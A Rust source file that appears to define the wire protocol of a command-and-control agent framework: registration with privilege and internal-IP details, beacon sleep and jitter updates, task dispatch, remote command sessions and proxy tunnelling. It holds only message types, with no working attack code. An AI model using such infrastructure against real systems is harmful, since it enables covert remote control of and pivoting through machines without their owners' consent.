//! Messages - protocol messages

use serde::{Deserialize, Serialize};

#[derive(Debug, Clone, Serialize)]
#[serde(tag = "type", rename_all = "snake_case")]
pub enum AgentMessage {
    Register {
        agent_id: String,
        hostname: String,
        username: Option<String>,
        protocol_version: u32,
        os: Option<String>,
        arch: Option<String>,
        pid: Option<u32>,
        internal_ip: Option<String>,
        privilege: String,
        tags: Vec<String>,
        sleep_interval: u64,
        jitter: u32,
        token: Option<String>,
        session_nonce: Option<String>,
        auth_response: Option<String>,
    },
    Heartbeat {
        agent_id: Option<String>,
    },
    ConfigUpdated {
        request_id: String,
        sleep_interval: u64,
        jitter: u32,
    },
    TaskResult {
        task_id: String,
        success: bool,
        output: String,
    },
    TaskResultChunk {
        task_id: String,
        chunk_index: u32,
        total_chunks: u32,
        data: String,
        is_last: bool,
        success: bool,
    },
    TaskUpdate {
        task_id: String,
        status: AgentTaskStatus,
        output: Option<String>,
    },
    CommandSessionOpened {
        command_session_id: String,
        cwd: String,
    },
    CommandSessionStarted {
        command_session_id: String,
        request_id: String,
    },
    CommandSessionOutputChunk {
        command_session_id: String,
        request_id: String,
        stream: CommandOutputStream,
        chunk: String,
        sequence: u32,
    },
    CommandSessionResult {
        command_session_id: String,
        request_id: String,
        line: String,
        cwd_before: String,
        cwd_after: String,
        exit_code: i32,
        stdout: String,
        stderr: String,
        success: bool,
    },
    CommandSessionClosed {
        command_session_id: String,
    },
    ProxyOpened {
        proxy_id: String,
        bind_addr: String,
    },
    ProxyConnectResult {
        proxy_id: String,
        stream_id: String,
        success: bool,
        detail: Option<String>,
    },
    ProxyData {
        proxy_id: String,
        stream_id: String,
        data_base64: String,
    },
    ProxyClosed {
        proxy_id: String,
        stream_id: String,
    },
    ProxyError {
        proxy_id: String,
        stream_id: Option<String>,
        detail: String,
    },
    ProxySessionClosed {
        proxy_id: String,
    },
}

#[derive(Debug, Clone, Deserialize)]
#[serde(tag = "type", rename_all = "snake_case")]
pub enum ServerCommand {
    Hello {
        protocol_version: u32,
        session_nonce: String,
        listener_id: Option<i64>,
        listener_name: Option<String>,
        transport: String,
        capabilities: Vec<String>,
        auth_mode: String,
    },
    Ack {
        message: String,
    },
    Disconnect {
        reason: Option<String>,
    },
    DispatchTask {
        task_id: String,
        command: String,
        payload: Option<String>,
    },
    UpdateBeaconConfig {
        request_id: String,
        sleep_interval: u64,
        jitter: u32,
    },
    CancelTask {
        task_id: String,
    },
    OpenCommandSession {
        command_session_id: String,
    },
    ExecuteCommandSession {
        command_session_id: String,
        request_id: String,
        line: String,
    },
    CloseCommandSession {
        command_session_id: String,
    },
    OpenProxy {
        proxy_id: String,
        bind_addr: String,
    },
    ProxyConnect {
        proxy_id: String,
        stream_id: String,
        host: String,
        port: u16,
    },
    ProxyData {
        proxy_id: String,
        stream_id: String,
        data_base64: String,
    },
    ProxyClose {
        proxy_id: String,
        stream_id: String,
    },
    CloseProxy {
        proxy_id: String,
    },
}

#[derive(Debug, Clone, Serialize)]
#[serde(rename_all = "snake_case")]
pub enum AgentTaskStatus {
    Running,
    Cancelled,
}

#[derive(Debug, Clone, Serialize)]
#[serde(rename_all = "snake_case")]
pub enum CommandOutputStream {
    Stdout,
    Stderr,
}

#[derive(Debug, Clone)]
pub struct ServerHello {
    pub session_nonce: String,
    pub auth_mode: String,
}
